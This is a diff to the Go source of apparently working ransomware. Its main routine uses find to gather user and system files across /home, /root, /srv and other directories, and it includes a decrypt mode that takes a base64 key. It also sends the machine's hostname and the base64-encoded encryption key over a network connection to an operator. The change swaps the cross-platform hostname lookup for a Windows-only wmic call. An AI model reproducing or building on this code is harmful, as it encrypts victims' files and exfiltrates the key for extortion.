@@ -11,7 +11,6 @@ import (
 	"net"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"runtime"
 	"strings"
 	"sync"
@@ -77,6 +76,7 @@ func DeCrypt(filename string, ch chan string) {
 
 func main() {
 	var listfile []string
+
 	cmd := exec.Command("bash", "-c", "find /home /opt /root /srv /tmp -type f -size -200M ! -path \"*.bash*\" ! -path \"*.desktop*\" ! -path \"*.cache*\" ! -path \"*.mozilla*\" 2> /dev/null")
 	output, _ := cmd.CombinedOutput()
 	listfile = strings.Split(string(output), "\n")
@@ -105,21 +105,15 @@ func main() {
 			return
 		}
 		wgc.Wait()
-		switch runtime.GOOS {
-		case "windows":
-			name := ""
-			output, _ := exec.Command("wmic", "computersystem", "get", "name").Output()
-			for _, letter := range string(output)[4:] {
-				if letter != 32 && letter != 13 && letter != 10 {
-					name += string(letter)
-				}
+		name := ""
+		output, _ := exec.Command("wmic", "computersystem", "get", "name").Output()
+		for _, letter := range string(output)[4:] {
+			if letter != 32 && letter != 13 && letter != 10 {
+				name += string(letter)
 			}
-			fmt.Fprintf(c, name+"|"+base64.StdEncoding.EncodeToString(CryptKey))
-		case "linux":
-			cmd := exec.Command("cat", "/etc/hostname")
-			output, _ := cmd.CombinedOutput()
-			fmt.Fprintf(c, string(output)[:len(string(output))-1]+"|"+base64.StdEncoding.EncodeToString(CryptKey))
 		}
+		fmt.Fprintf(c, name+"|"+base64.StdEncoding.EncodeToString(CryptKey))
+
 	} else if len(args) == 2 && args[0] == "--decrypt" {
 		CryptKey, _ = base64.StdEncoding.DecodeString(args[1])
 		for i := 0; i < 100; i++ {
